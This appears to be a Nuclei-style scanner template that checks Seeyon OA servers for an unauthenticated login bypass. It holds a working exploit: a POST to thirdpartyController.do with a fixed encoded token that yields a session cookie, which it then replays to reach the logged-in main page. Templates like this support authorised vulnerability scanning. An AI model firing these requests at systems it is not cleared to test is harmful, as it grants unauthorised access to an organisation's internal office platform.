id: seeyon-unauth
info:
  author: pikpikcu
  name: Seeyon Unauthoried
  severity: low
  tags: seeyon,unauth
requests:
- extractors:
  - internal: true
    name: session
    part: header
    regex:
    - JSESSIONID=(.*)
    type: regex
  matchers:
  - condition: and
    part: body
    type: word
    words:
    - "\u5F53\u524D\u5DF2\u767B\u5F55\u4E86\u4E00\u4E2A\u7528\u6237\uFF0C\u540C\u4E00\
      \u7A97\u53E3\u4E2D\u4E0D\u80FD\u767B\u5F55\u591A\u4E2A\u7528\u6237"
    - <a href='/seeyon/main.do?method=logout'
  raw:
  - 'POST /seeyon/thirdpartyController.do HTTP/1.1

    Host: {{Hostname}}

    User-Agent: Mozilla/5.0 (Windows NT 10.0; rv:78.0) Gecko/20100101 Firefox/78.0

    Content-Length: 5

    Content-Type: application/x-www-form-urlencoded

    Accept-Encoding: deflate

    method=access&enc=TT5uZnR0YmhmL21qb2wvZXBkL2dwbWVmcy9wcWZvJ04%2BLjgzODQxNDMxMjQzNDU4NTkyNzknVT4zNjk0NzI5NDo3MjU4

    '
  - 'GET /seeyon/main.do HTTP/1.1

    Host: {{Hostname}}

    User-Agent: Mozilla/5.0 (Windows NT 10.0; rv:78.0) Gecko/20100101 Firefox/78.0

    Accept-Encoding: deflate

    Content-Type: application/x-www-form-urlencoded

    Cookie: {{session}}

    '
